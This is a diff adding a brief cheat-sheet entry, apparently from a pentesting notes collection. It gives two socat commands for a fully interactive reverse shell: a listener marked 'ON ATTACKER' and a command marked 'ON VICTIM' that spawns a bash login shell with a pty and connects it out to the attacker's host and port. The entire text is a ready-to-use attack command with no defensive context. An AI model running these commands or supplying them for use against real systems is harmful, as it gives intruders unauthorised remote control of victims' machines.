@@ -1,0 +1,5 @@
+## ON ATTACKER
+socat file:`tty`,raw,echo=0 tcp-listen:${LPORT}
+
+## ON VICTIM
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}
